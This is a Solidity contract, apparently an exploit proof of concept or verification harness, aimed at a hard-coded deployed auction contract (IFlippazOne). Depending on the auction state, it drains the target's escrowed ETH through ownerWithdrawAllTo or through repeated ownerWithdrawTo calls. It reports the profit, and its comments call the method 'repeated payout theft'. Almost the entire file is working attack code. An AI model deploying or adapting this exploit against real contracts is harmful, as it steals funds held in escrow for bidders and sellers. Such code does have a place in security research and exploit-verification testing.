// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

interface IFlippazOne {
    function auctionEnded() external view returns (bool);
    function auctionEndTimestamp() external view returns (uint256);
    function highestBid() external view returns (uint256);
    function ownerWithdrawTo(address toAddress) external;
    function ownerWithdrawAllTo(address toAddress) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xE85A08Cf316F695eBE7c13736C8Cc38a7Cc3e944;

    enum Path {
        None,
        EarlyDrainAllTo,
        RepeatedOwnerWithdrawTo,
        InfeasibleAtForkState
    }

    uint256 private _profitAmount;
    Path public pathUsed;
    string public lastError;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        uint256 startingBalance = address(this).balance;
        IFlippazOne target = IFlippazOne(TARGET);

        uint256 escrowBalance = TARGET.balance;
        if (escrowBalance == 0) {
            pathUsed = Path.InfeasibleAtForkState;
            lastError = "target balance is zero";
            _profitAmount = 0;
            return;
        }

        bool ended = target.auctionEnded();
        uint256 endTimestamp = target.auctionEndTimestamp();

        if (!ended && block.timestamp < endTimestamp) {
            target.ownerWithdrawAllTo(address(this));
            pathUsed = Path.EarlyDrainAllTo;
            lastError = "";
            _profitAmount = address(this).balance - startingBalance;
            return;
        }

        if (ended || block.timestamp > endTimestamp) {
            uint256 bidSize = target.highestBid();

            // Repeated payout theft is only mechanically available when the seller payout size is non-zero.
            // If highestBid is zero, the original post-deadline exploit path cannot realize profit.
            if (bidSize == 0) {
                pathUsed = Path.InfeasibleAtForkState;
                lastError = "highestBid is zero";
                _profitAmount = 0;
                return;
            }

            uint256 pulls = TARGET.balance / bidSize;

            // If the remaining escrow is smaller than one seller payout, ownerWithdrawTo(attacker)
            // reverts on the first attempt because the target cannot transfer highestBid.
            if (pulls == 0) {
                pathUsed = Path.InfeasibleAtForkState;
                lastError = "target balance below highestBid";
                _profitAmount = 0;
                return;
            }

            for (uint256 index = 0; index < pulls; index++) {
                target.ownerWithdrawTo(address(this));
            }

            // If TARGET.balance was not an exact multiple of highestBid, this specific exploit path leaves
            // residual dust below highestBid that cannot be pulled by another ownerWithdrawTo call.
            pathUsed = Path.RepeatedOwnerWithdrawTo;
            lastError = "";
            _profitAmount = address(this).balance - startingBalance;
            return;
        }

        // At exact deadline with auctionEnded == false, the active-auction stage is already over,
        // while ownerWithdrawTo still rejects because it requires block.timestamp > auctionEndTimestamp
        // unless endAuction()/buyNow() has already set auctionEnded = true.
        pathUsed = Path.InfeasibleAtForkState;
        lastError = "exact deadline without auctionEnded";
        _profitAmount = 0;
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}
